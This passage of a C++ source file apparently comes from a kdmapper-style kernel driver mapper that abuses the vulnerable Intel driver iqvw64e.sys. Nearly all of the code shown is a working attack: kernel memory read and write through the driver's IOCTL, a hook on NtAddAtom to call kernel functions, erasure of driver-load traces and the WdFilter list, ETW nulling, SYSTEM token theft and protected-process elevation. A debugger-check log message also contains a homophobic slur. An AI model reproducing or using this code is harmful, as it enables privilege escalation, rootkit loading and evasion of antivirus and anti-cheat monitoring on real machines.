#pragma once
#include <Windows.h>
#include <iostream>
#include <string>
#include <memory>
#include <stdint.h>

#include "intel_driver_resource.hpp"
#include "utils.hpp"
#include "../lib/sys.hpp"

namespace intel_driver
{
	extern char driver_name[100]; //"iqvw64e.sys"
	constexpr uint32_t ioctl1 = 0x80862007;
	constexpr DWORD iqvw64e_timestamp = 0x5284EAC3;
	extern ULONG64 ntoskrnlAddr;

	typedef struct _COPY_MEMORY_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t source;
		uint64_t destination;
		uint64_t length;
	}COPY_MEMORY_BUFFER_INFO, * PCOPY_MEMORY_BUFFER_INFO;

	typedef struct _FILL_MEMORY_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved1;
		uint32_t value;
		uint32_t reserved2;
		uint64_t destination;
		uint64_t length;
	}FILL_MEMORY_BUFFER_INFO, * PFILL_MEMORY_BUFFER_INFO;

	typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t return_physical_address;
		uint64_t address_to_translate;
	}GET_PHYS_ADDRESS_BUFFER_INFO, * PGET_PHYS_ADDRESS_BUFFER_INFO;

	typedef struct _MAP_IO_SPACE_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t return_value;
		uint64_t return_virtual_address;
		uint64_t physical_address_to_map;
		uint32_t size;
	}MAP_IO_SPACE_BUFFER_INFO, * PMAP_IO_SPACE_BUFFER_INFO;

	typedef struct _UNMAP_IO_SPACE_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved1;
		uint64_t reserved2;
		uint64_t virt_address;
		uint64_t reserved3;
		uint32_t number_of_bytes;
	}UNMAP_IO_SPACE_BUFFER_INFO, * PUNMAP_IO_SPACE_BUFFER_INFO;

	typedef struct _RTL_BALANCED_LINKS {
		struct _RTL_BALANCED_LINKS* Parent;
		struct _RTL_BALANCED_LINKS* LeftChild;
		struct _RTL_BALANCED_LINKS* RightChild;
		CHAR Balance;
		UCHAR Reserved[3];
	} RTL_BALANCED_LINKS;
	typedef RTL_BALANCED_LINKS* PRTL_BALANCED_LINKS;

	typedef struct _RTL_AVL_TABLE {
		RTL_BALANCED_LINKS BalancedRoot;
		PVOID OrderedPointer;
		ULONG WhichOrderedElement;
		ULONG NumberGenericTableElements;
		ULONG DepthOfTree;
		PVOID RestartKey;
		ULONG DeleteCount;
		PVOID CompareRoutine;
		PVOID AllocateRoutine;
		PVOID FreeRoutine;
		PVOID TableContext;
	} RTL_AVL_TABLE;
	typedef RTL_AVL_TABLE* PRTL_AVL_TABLE;

	typedef struct _PiDDBCacheEntry
	{
		LIST_ENTRY		List;
		UNICODE_STRING	DriverName;
		ULONG			TimeDateStamp;
		NTSTATUS		LoadStatus;
		char			_0x0028[16]; // data from the shim engine, or uninitialized memory for custom drivers
	} PiDDBCacheEntry, * NPiDDBCacheEntry;

	typedef struct _HashBucketEntry
	{
		struct _HashBucketEntry* Next;
		UNICODE_STRING DriverName;
		ULONG CertHash[5];
	} HashBucketEntry, * PHashBucketEntry;

	bool ClearPiDDBCacheTable(HANDLE device_handle);
	bool ExAcquireResourceExclusiveLite(HANDLE device_handle, PVOID Resource, BOOLEAN wait);
	bool ExReleaseResourceLite(HANDLE device_handle, PVOID Resource);
	BOOLEAN RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOID Table, PVOID Buffer);
	PVOID RtlLookupElementGenericTableAvl(HANDLE device_handle, PRTL_AVL_TABLE Table, PVOID Buffer);
	PiDDBCacheEntry* LookupEntry(HANDLE device_handle, PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t * name);
	PVOID ResolveRelativeAddress(HANDLE device_handle, _In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize);

	uintptr_t FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask);
	uintptr_t FindSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, PULONG size);
	uintptr_t FindPatternInSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask);
	std::wstring IdentifyHookingDriver(uint64_t address);
	bool CheckForDebugger(HANDLE device_handle);
	bool NullEtwpBootPhase(HANDLE device_handle);
	bool ProtectProcess(HANDLE device_handle);
	bool IsAddressInModule(uint64_t address, uint64_t module_base, uint64_t module_size);
	bool CheckForIATHooks(HANDLE device_handle, uint64_t driver_object, uint64_t ntoskrnl_base, uint64_t ntoskrnl_size);
	int CheckForDriverDispatchHook(HANDLE device_handle);
	bool ElevateTokenToSystemAndProtect(HANDLE device_handle);
	bool ClearKernelHashBucketList(HANDLE device_handle);
	bool ClearWdFilterDriverList(HANDLE device_handle);

	bool IsRunning();
	HANDLE Load();
	bool Unload(HANDLE device_handle);

	bool MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size);
	bool GetPhysicalAddress(HANDLE device_handle, uint64_t address, uint64_t* out_physical_address);
	uint64_t MapIoSpace(HANDLE device_handle, uint64_t physical_address, uint32_t size);
	bool UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t size);
	bool ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size);
	bool WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size);
	bool WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size);
	PVOID FindUnusedSpace(HANDLE device_handle, uintptr_t base, unsigned long section_size, size_t required_size, size_t chunk_size = 0x10000);
	uint64_t MmRemovePhysicalMemory(HANDLE device_handle, uint64_t address, size_t size);
	uint64_t MiGetPdeAddress(HANDLE device_handle, uint64_t address);
	uint64_t MiGetPteAddress(HANDLE device_handle, uint64_t address);
	uint64_t MmAllocateIndependentPagesEx(HANDLE device_handle, uint32_t size);
	bool MmFreeIndependentPages(HANDLE device_handle, uint64_t address, uint32_t size);
	BOOLEAN MmSetPageProtection(HANDLE device_handle, uint64_t address, uint32_t size, ULONG new_protect);
	
	/**/

	bool FreePool(HANDLE device_handle, uint64_t address);
	uint64_t GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name);
	int ClearMmUnloadedDrivers(HANDLE device_handle);
	std::wstring GetDriverNameW();
	std::wstring GetDriverPath();

	template<typename T, typename ...A>
	__forceinline bool CallKernelFunction(HANDLE device_handle, T* out_result, uint64_t kernel_function_address, const A ...arguments) {
		constexpr auto call_void = std::is_same_v<T, void>;

		if constexpr (!call_void) {
			if (!out_result)
				return false;
		}
		else {
			UNREFERENCED_PARAMETER(out_result);
		}

		if (!kernel_function_address)
			return false;

		auto module = shadow::c_module{ "ntdll.dll" };
		if (module.base_address() == 0) {
			Log(L"[-] Failed to load ntdll.dll" << std::endl); //never should happen
			return false;
		}

		auto NtAddAtom = shadow::c_export{ "NtAddAtom" }.to_pointer();
		if (!NtAddAtom)
		{
			Log(L"[-] Failed to get export ntdll.NtAddAtom" << std::endl);
			return false;
		}

		uint8_t kernel_injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
		uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
		*(uint64_t*)&kernel_injected_jmp[2] = kernel_function_address;

		static uint64_t kernel_NtAddAtom = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, ("NtAddAtom"));
		if (!kernel_NtAddAtom) {
			Log(L"[-] Failed to get export ntoskrnl.NtAddAtom" << std::endl);
			return false;
		}

		if (!ReadMemory(device_handle, kernel_NtAddAtom, &original_kernel_function, sizeof(kernel_injected_jmp)))
			return false;

		if (original_kernel_function[0] == kernel_injected_jmp[0] &&
			original_kernel_function[1] == kernel_injected_jmp[1] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 2] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 2] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 1] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 1]) {
			Log(L"[-] FAILED!: The code was already hooked!! another instance of kdmapper running?!" << std::endl);
			return false;
		}

		// Overwrite the pointer with kernel_function_address
		if (!WriteToReadOnlyMemory(device_handle, kernel_NtAddAtom, &kernel_injected_jmp, sizeof(kernel_injected_jmp)))
			return false;

		// Call function
		if constexpr (!call_void) {
			using FunctionFn = T(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			*out_result = Function(arguments...);
		}
		else {
			using FunctionFn = void(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			Function(arguments...);
		}

		// Restore the pointer/jmp
		return WriteToReadOnlyMemory(device_handle, kernel_NtAddAtom, original_kernel_function, sizeof(kernel_injected_jmp));
	}
}

inline bool RegisterAndStart(const std::wstring& driver_path) {
	const static DWORD ServiceTypeKernel = 1;
	const std::wstring driver_name = intel_driver::GetDriverNameW();
	const std::wstring servicesPath = (L"SYSTEM\\CurrentControlSet\\Services\\") + driver_name;
	const std::wstring nPath = (L"\\??\\") + driver_path;

	HKEY dservice;
	LSTATUS status = shadowcall<LSTATUS>("RegCreateKeyW", HKEY_LOCAL_MACHINE, servicesPath.c_str(), &dservice); //Returns Ok if already exists
	if (status != ERROR_SUCCESS) {
		Log("[-] Can't create service key" << std::endl);
		return false;
	}

	status = shadowcall<LSTATUS>("RegSetKeyValueW", dservice, NULL, (L"ImagePath"), REG_EXPAND_SZ, nPath.c_str(), (DWORD)(nPath.size() * sizeof(wchar_t)));
	if (status != ERROR_SUCCESS) {
		shadowcall<LSTATUS>("RegCloseKey", dservice);
		Log("[-] Can't create 'ImagePath' registry value" << std::endl);
		return false;
	}

	status = shadowcall<LSTATUS>("RegSetKeyValueW", dservice, NULL, (L"Type"), REG_DWORD, &ServiceTypeKernel, sizeof(DWORD));
	if (status != ERROR_SUCCESS) {
		shadowcall<LSTATUS>("RegCloseKey", dservice);
		Log("[-] Can't create 'Type' registry value" << std::endl);
		return false;
	}

	shadowcall<LSTATUS>("RegCloseKey", dservice);

	ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
	BOOLEAN SeLoadDriverWasEnabled;
	NTSTATUS Status = shadowcall<NTSTATUS>("RtlAdjustPrivilege", SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled);
	if (!NT_SUCCESS(Status)) {
		Log("Fatal error: failed to acquire SE_LOAD_DRIVER_PRIVILEGE. Make sure you are running as administrator." << std::endl);
		return false;
	}

	std::wstring wdriver_reg_path = (L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\") + driver_name;
	UNICODE_STRING serviceStr;
	shadowcall<VOID>("RtlInitUnicodeString", &serviceStr, wdriver_reg_path.c_str());

	Status = shadowsyscall<NTSTATUS>("NtLoadDriver", &serviceStr);

	Log("[+] NtLoadDriver Status 0x" << std::hex << Status << std::endl);

	//Never should occur since kdmapper checks for "IsRunning" driver before
	if (Status == 0xC000010E) {// STATUS_IMAGE_ALREADY_LOADED
		return true;
	}

	return NT_SUCCESS(Status);
}

bool StopAndRemove(const std::wstring& driver_name) {

	std::wstring wdriver_reg_path = (L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\") + driver_name;
	UNICODE_STRING serviceStr;
	shadowcall<VOID>("RtlInitUnicodeString", &serviceStr, wdriver_reg_path.c_str());

	HKEY driver_service;
	std::wstring servicesPath = (L"SYSTEM\\CurrentControlSet\\Services\\") + driver_name;
	LSTATUS status = shadowcall< LSTATUS>("RegOpenKeyW", HKEY_LOCAL_MACHINE, servicesPath.c_str(), &driver_service);
	if (status != ERROR_SUCCESS) {
		if (status == ERROR_FILE_NOT_FOUND) {
			return true;
		}
		return false;
	}
	shadowcall<LSTATUS>("RegCloseKey", driver_service);

	auto st = shadowsyscall<NTSTATUS>("NtUnloadDriver", &serviceStr);
	Log("[+] NtUnloadDriver Status 0x" << std::hex << st << std::endl);
	if (st != 0x0) {
		Log("[-] Driver Unload Failed!!" << std::endl);
		status = shadowcall<LSTATUS>("RegDeleteTreeW", HKEY_LOCAL_MACHINE, servicesPath.c_str());
		return false; //lets consider unload fail as error because can cause problems with anti cheats later
	}


	status = shadowcall<LSTATUS>("RegDeleteTreeW", HKEY_LOCAL_MACHINE, servicesPath.c_str());
	if (status != ERROR_SUCCESS) {
		return false;
	}
	return true;
}

inline ULONG64 intel_driver::ntoskrnlAddr = 0;
inline char intel_driver::driver_name[100] = {};
inline uintptr_t PiDDBLockPtr;
inline uintptr_t PiDDBCacheTablePtr;

std::wstring intel_driver::GetDriverNameW() {
	std::string t(intel_driver::driver_name);
	std::wstring name(t.begin(), t.end());
	return name;
}

std::wstring intel_driver::GetDriverPath() {
	std::wstring temp = utils::GetFullTempPath();
	if (temp.empty()) {
		return L"";
	}
	return temp + L"\\" + GetDriverNameW();
}

bool intel_driver::IsRunning() {
	UNICODE_STRING deviceName;
	shadowcall<NTSTATUS>("RtlInitUnicodeString", &deviceName, (L"\\Device\\Nal"));

	OBJECT_ATTRIBUTES objAttr;
	InitializeObjectAttributes(&objAttr, &deviceName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	IO_STATUS_BLOCK ioStatusBlock;
	HANDLE fileHandle;

	auto status = shadowsyscall<NTSTATUS>("NtCreateFile",
		&fileHandle,
		FILE_ANY_ACCESS,
		&objAttr,
		&ioStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		FILE_OPEN,
		0,
		NULL,
		0
	);

	if (NT_SUCCESS(status)) {
		shadowsyscall<NTSTATUS>("NtClose", fileHandle);
		return true;
	}

	return false;
}
HANDLE intel_driver::Load() {
	srand((unsigned)time(NULL) * GetCurrentThreadId());

	//from https://github.com/ShoaShekelbergstein/kdmapper as some Drivers takes same device name
	if (intel_driver::IsRunning()) {
		Log(L"[-] \\Device\\Nal is already in use." << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	//Randomize name for log in registry keys, usn jornal and other shits
	memset(intel_driver::driver_name, 0, sizeof(intel_driver::driver_name));

	static const char alphanum[] =
		"abcdefghijklmnopqrstuvwxyz"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	int len = (rand)() % 20 + 10;
	for (int i = 0; i < len; ++i)
		intel_driver::driver_name[i] = alphanum[(rand)() % (sizeof(alphanum) - 1)];

	Log(L"[<] Loading vulnerable driver, Name: " << GetDriverNameW() << std::endl);

	std::wstring driver_path = GetDriverPath();
	if (driver_path.empty()) {
		Log(L"[-] Can't find TEMP folder" << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	(_wremove)(driver_path.c_str());

	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver))) {
		Log(L"[-] Failed to create vulnerable driver file" << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	if (!RegisterAndStart(driver_path)) {
		Log(L"[-] Failed to register and start service for the vulnerable driver" << std::endl);
		(_wremove)(driver_path.c_str());
		return INVALID_HANDLE_VALUE;
	}

	UNICODE_STRING deviceName;
	shadowcall<VOID>("RtlInitUnicodeString", &deviceName, (L"\\Device\\Nal"));

	// Initialize OBJECT_ATTRIBUTES
	OBJECT_ATTRIBUTES objAttr;
	InitializeObjectAttributes(&objAttr, &deviceName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	IO_STATUS_BLOCK ioStatusBlock;
	HANDLE result;

	// Open the device using NtCreateFile
	 auto status = shadowsyscall<NTSTATUS>("NtCreateFile",
		&result,
		GENERIC_READ | GENERIC_WRITE,
		&objAttr,
		&ioStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		0,
		FILE_OPEN,
		0,
		NULL,
		0
	);

	if (!NT_SUCCESS(status)) {
		Log(L"[-] Failed to open device using NtCreateFile");
	}

	if (!result || result == INVALID_HANDLE_VALUE || !NT_SUCCESS(status))
	{
		Log(L"[-] Failed to load driver iqvw64e.sys" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}
	 
	ntoskrnlAddr = utils::GetKernelModuleAddress("ntoskrnl.exe");
	if (ntoskrnlAddr == 0) {
		Log(L"[-] Failed to get ntoskrnl.exe" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	//check MZ ntoskrnl.exe
	IMAGE_DOS_HEADER dosHeader = { 0 };
	if (!intel_driver::ReadMemory(result, intel_driver::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
		Log(L"[-] Can't exploit intel driver, is there any antivirus or anticheat running?" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}


	if (intel_driver::CheckForDebugger(result)) {
		// Crash, Ban, do whatever
		return (HANDLE)(0x5232);
	};

	//intel_driver::NullEtwpBootPhase(result); // Stops ETW based process hacker apps like ProcMonX and ProcMonXv2

	if (intel_driver::CheckForDriverDispatchHook(result) == 2) {
		Log(L"[-] Failed to Verify Driver Dispatch" << std::endl);
		// Crash, Ban, do whatever
		return (HANDLE)(0x5232);
	}

	if (!intel_driver::ClearPiDDBCacheTable(result)) {
		Log(L"[-] Failed to ClearPiDDBCacheTable" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearKernelHashBucketList(result)) {
		Log(L"[-] Failed to ClearKernelHashBucketList" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearMmUnloadedDrivers(result)) {
		Log(L"[!] Failed to ClearMmUnloadedDrivers" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearWdFilterDriverList(result)) {
		Log("[!] Failed to ClearWdFilterDriverList" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	return result;
}

bool intel_driver::CheckForDebugger(HANDLE device_handle) {


	static uint64_t kernel_PsGetCurrentProcess = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "IoGetCurrentProcess");

	if (!kernel_PsGetCurrentProcess) {
		Log(L"[!] Failed to find IoGetCurrentProcess" << std::endl);
		return false;
	}

	uint64_t current_eprocess_address = 0;

	if (!CallKernelFunction(device_handle, &current_eprocess_address, kernel_PsGetCurrentProcess)) {
		Log(L"[!] Failed to call IoGetCurrentProcess" << std::endl);
		return false;
	}

	struct process_flags
	{
		ULONG CreateReported : 1;
		ULONG NoDebugInherit : 1;
		ULONG ProcessExiting : 1;
		ULONG ProcessDelete : 1;
		ULONG ManageExecutableMemoryWrites : 1;
		ULONG VmDeleted : 1;
		ULONG OutswapEnabled : 1;
		ULONG Outswapped : 1;
		ULONG FailFastOnCommitFail : 1;
		ULONG Wow64VaSpace4Gb : 1;
		ULONG AddressSpaceInitialized : 2;
		ULONG SetTimerResolution : 1;
		ULONG BreakOnTermination : 1;
		ULONG DeprioritizeViews : 1;
		ULONG WriteWatch : 1;
		ULONG ProcessInSession : 1;
		ULONG OverrideAddressSpace : 1;
		ULONG HasAddressSpace : 1;
		ULONG LaunchPrefetched : 1;
		ULONG Background : 1;
		ULONG VmTopDown : 1;
		ULONG ImageNotifyDone : 1;
		ULONG PdeUpdateNeeded : 1;
		ULONG VdmAllowed : 1;
		ULONG ProcessRundown : 1;
		ULONG ProcessInserted : 1;
		ULONG DefaultIoPriority : 3;
		ULONG ProcessSelfDelete : 1;
		ULONG SetTimerResolutionLink : 1;
	};

	process_flags pf = { 0 };

	if (!ReadMemory(device_handle, current_eprocess_address + 0x464, &pf, sizeof(pf))) {
		Log(L"[!] Failed to find Flags" << std::endl);
		return false;
	}

	if (pf.NoDebugInherit != 0) {
		Log(L"[!] Found debugger, kill yourself faggot" << std::endl);
		return true;
	}

	Log(L"[+] Debugger not found" << std::endl);

	return false;
}


bool intel_driver::NullEtwpBootPhase(HANDLE device_handle) {

	static uint64_t kernel_EtwpBootPhase = 0;

	if (!kernel_EtwpBootPhase)
	{
		kernel_EtwpBootPhase = intel_driver::FindPatternInSectionAtKernel(device_handle, (char*)("PAGE"), intel_driver::ntoskrnlAddr,
			(BYTE*)("\x44\x38\x05\x00\x00\x00\x00\x48\x8D\x9F\x00\x00\x00\x00\x0F\x10\x45\xC7"),
			(char*)("xxx????xxx????xxxx"));
		if (!kernel_EtwpBootPhase) {
			Log(L"[!] Failed to find EtwpBootPhase, trying EtwpFileSystemReady" << std::endl);
			kernel_EtwpBootPhase = intel_driver::FindPatternInSectionAtKernel(device_handle, (char*)("PAGE"), intel_driver::ntoskrnlAddr,
				(BYTE*)("\x44\x39\x3D\x00\x00\x00\x00\x41\xBC\x00\x00\x00\x00\x74\x23\x44\x89\x4C\x24\x00\x48\x8B\xD7"), // 44 39 3D ? ? ? ? 41 BC ? ? ? ? 74 23 44 89 4C 24 ? 48 8B D7 EtwpFileSystemReady
				(char*)("xxx????xx????xxxxxx?xxx"));

			if (!kernel_EtwpBootPhase) {
				Log(L"[!] Failed to find EtwpFileSystemReady" << std::endl);
				return false;
			}
			else {
				Log(L"[+] Found EtwpFileSystemReady pattern" << std::endl);
			}
		}

		kernel_EtwpBootPhase = (uint64_t)ResolveRelativeAddress(device_handle, (PVOID)kernel_EtwpBootPhase, 3, 7);
		if (!kernel_EtwpBootPhase) {
			Log(L"[!] Failed to resolve relative address EtwpBootPhase/EtwpFileSystemReady" << std::endl);
			return false;
		}
	}


	unsigned long buffer = 0;
	if (!WriteMemory(device_handle, kernel_EtwpBootPhase, &buffer, sizeof(unsigned long))) {
		Log(L"[!] Failed to null EtwpBootPhase/EtwpFileSystemReady" << std::endl);
		return false;
	}

	return true;

}
__forceinline bool intel_driver::ProtectProcess(HANDLE device_handle) {


	static uint64_t kernel_PsGetCurrentProcess = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, ("IoGetCurrentProcess"));

	if (!kernel_PsGetCurrentProcess) {
		Log(L"[!] Failed to find IoGetCurrentProcess" << std::endl);
		return false;
	}

	uint64_t current_eprocess_address = 0;

	if (!CallKernelFunction(device_handle, &current_eprocess_address, kernel_PsGetCurrentProcess)) {
		Log(L"[!] Failed to call IoGetCurrentProcess" << std::endl);
		return false;
	}


	nt::_PS_PROTECTION ps_protection = {};

	if (!ReadMemory(device_handle, current_eprocess_address + 0x87a, &ps_protection, sizeof(ps_protection))) {
		Log(L"[!] Failed to find _PS_PROTECTION" << std::endl);
		return false;
	}

	ps_protection.Signer = 7;
	ps_protection.Type = 3;

	if (!WriteMemory(device_handle, current_eprocess_address + 0x87a, &ps_protection, sizeof(ps_protection))) {
		Log(L"[!] Failed to write _PS_PROTECTION" << std::endl);
		return false;
	}

	return true;
}


__forceinline bool intel_driver::ElevateTokenToSystemAndProtect(HANDLE device_handle) {


	static uint64_t kernel_PsGetCurrentProcess = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "IoGetCurrentProcess");
	if (!kernel_PsGetCurrentProcess) {
		Log(L"[!] Failed to find IoGetCurrentProcess" << std::endl);
		return false;
	}

	static uint64_t kernel_PsInitialSystemProcess = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "PsInitialSystemProcess");
	if (!kernel_PsInitialSystemProcess) {
		Log(L"[!] Failed to find PsInitialSystemProcess" << std::endl);
		return false;
	}

	uint64_t system_eprocess_address = 0;
	if (!ReadMemory(device_handle, kernel_PsInitialSystemProcess, &system_eprocess_address, sizeof(system_eprocess_address))) {
		Log(L"[!] Failed to read system eproc addr" << std::endl);
		return false;
	}


	uint64_t current_eprocess_address = 0;
	if (!CallKernelFunction(device_handle, &current_eprocess_address, kernel_PsGetCurrentProcess)) {
		Log(L"[!] Failed to call IoGetCurrentProcess" << std::endl);
		return false;
	}


	nt::_PS_PROTECTION ps_protection = {};
	//if (!ReadMemory(device_handle, system_eprocess_address + 0x87a, &ps_protection, sizeof(ps_protection))) {
	//	Log(L"[!] Failed to find SYSTEM _PS_PROTECTION" << std::endl);
	//	return false;
	//}

	if (!ReadMemory(device_handle, current_eprocess_address + 0x87a, &ps_protection, sizeof(ps_protection))) {
		Log(L"[!] Failed to find SYSTEM _PS_PROTECTION" << std::endl);
		return false;
	}

	ps_protection.Signer = 6;
	ps_protection.Type = 2;

	if (!WriteMemory(device_handle, current_eprocess_address + 0x87a, &ps_protection, sizeof(ps_protection))) {
		Log(L"[!] Failed to write to _PS_PROTECTION" << std::endl);
		return false;
	}

	nt::_EX_FAST_REF token = {};
	if (!ReadMemory(device_handle, system_eprocess_address + 0x4b8, &token, sizeof(token))) {
		Log(L"[!] Failed to find SYSTEM Token" << std::endl);
		return false;
	}

	if (!WriteMemory(device_handle, current_eprocess_address + 0x4b8, &token, sizeof(token))) {
		Log(L"[!] Failed to write Token" << std::endl);
		return false;
	}

	return true;
}


__forceinline bool intel_driver::IsAddressInModule(uint64_t address, uint64_t module_base, uint64_t module_size) {
	return address >= module_base && address < (module_base + module_size);
}

__forceinline bool intel_driver::CheckForIATHooks(HANDLE device_handle, uint64_t driver_object, uint64_t ntoskrnl_base, uint64_t ntoskrnl_size) {
	uint64_t driver_start = 0;
	if (!ReadMemory(device_handle, driver_object + 0x18, &driver_start, sizeof(driver_start)) || !driver_start) {
		Log(L"[!] Failed to find driver_start" << std::endl);
		return false;
	}

	// Locate the PE header within the driver and find the IAT
	IMAGE_DOS_HEADER dos_header = { 0 };
	if (!ReadMemory(device_handle, driver_start, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE) {
		Log(L"[!] Failed to read DOS header or invalid DOS signature" << std::endl);
		return false;
	}

	IMAGE_NT_HEADERS nt_headers = { 0 };
	if (!ReadMemory(device_handle, driver_start + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE) {
		Log(L"[!] Failed to read NT headers or invalid NT signature" << std::endl);
		return false;
	}

	auto& data_directory = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT];
	uint64_t iat_rva = data_directory.VirtualAddress;
	uint64_t iat_size = data_directory.Size;

	if (iat_rva == 0 || iat_size == 0) {
		Log(L"[!] No IAT found in the driver" << std::endl);
		return false;
	}

	// Iterate through the IAT entries
	uint64_t iat_start = driver_start + iat_rva;
	for (size_t i = 0; i < iat_size / sizeof(uint64_t); ++i) {
		uint64_t function_ptr = 0;
		if (!ReadMemory(device_handle, iat_start + i * sizeof(uint64_t), &function_ptr, sizeof(function_ptr))) {
			Log(L"[!] Failed to read IAT entry at index: " << i << std::endl);
			continue;
		}

		if (!IsAddressInModule(function_ptr, ntoskrnl_base, ntoskrnl_size)) {
			Log(L"[!] Suspicious IAT entry found at index " << i << " with address: " << std::hex << function_ptr << std::endl);
			return true;
		}
	}

	Log(L"[+] No suspicious IAT entries found" << std::endl);
	return false;
}

std::wstring intel_driver::IdentifyHookingDriver(uint64_t address) {
	// Get the list of loaded modules (drivers)
	ULONG buffer_size = 0;
	auto status = shadowsyscall<NTSTATUS>("NtQuerySystemInformation",
		static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemModuleInformation),
		nullptr, buffer_size, &buffer_size);

	std::unique_ptr<uint8_t[]> buffer(new uint8_t[buffer_size]);

	status = shadowsyscall<NTSTATUS>("NtQuerySystemInformation",
		static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemModuleInformation),
		buffer.get(), buffer_size, &buffer_size);

	if (!NT_SUCCESS(status)) {
		Log(L"[!] Failed to query system module information: " << std::hex << status << std::endl);
		return L"";
	}

	auto modules = reinterpret_cast<nt::PRTL_PROCESS_MODULES>(buffer.get());
	for (unsigned int i = 0; i < modules->NumberOfModules; ++i) {
		auto& module = modules->Modules[i];
		uint64_t module_base = reinterpret_cast<uint64_t>(module.ImageBase);
		uint64_t module_size = module.ImageSize;

		if (address >= module_base && address < module_base + module_size) {
			// Convert the module name to a wide string
			std::string module_name(reinterpret_cast<char*>(module.FullPathName) + module.OffsetToFileName);
			return std::wstring(module_name.begin(), module_name.end());
		}
	}

	return L"";
}

// driver dispatch hook check can be improved
__forceinline int intel_driver::CheckForDriverDispatchHook(HANDLE device_handle) {
	ULONG buffer_size = 0;
	void* buffer = nullptr;

	auto status = shadowsyscall<NTSTATUS>("NtQuerySystemInformation",
		static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation),
		buffer, buffer_size, &buffer_size
	);

	while (status == nt::STATUS_INFO_LENGTH_MISMATCH) {
		if (buffer) {
			SIZE_T free_size = 0;
			auto free_status = shadowsyscall<NTSTATUS>("NtFreeVirtualMemory", NtCurrentProcess, &buffer, &free_size, MEM_RELEASE);
			if (!NT_SUCCESS(free_status)) {
				Log(L"[!] Failed to free memory: " << std::hex << free_status << std::endl);
				return 0;
			}
		}

		// Set buffer to nullptr to let the system choose the address
		buffer = nullptr;
		SIZE_T new_buffer_size = buffer_size;
		status = shadowsyscall<NTSTATUS>("NtAllocateVirtualMemory",
			NtCurrentProcess,
			&buffer,
			0,
			&new_buffer_size,
			MEM_RESERVE | MEM_COMMIT,
			PAGE_READWRITE
		);

		if (!NT_SUCCESS(status)) {
			Log(L"[!] Failed to allocate memory: " << std::hex << status << std::endl);
			return 0;
		}

		status = shadowsyscall<NTSTATUS>("NtQuerySystemInformation",
			static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation),
			buffer,
			buffer_size,
			&buffer_size
		);
	}

	if (!NT_SUCCESS(status) || buffer == nullptr) {
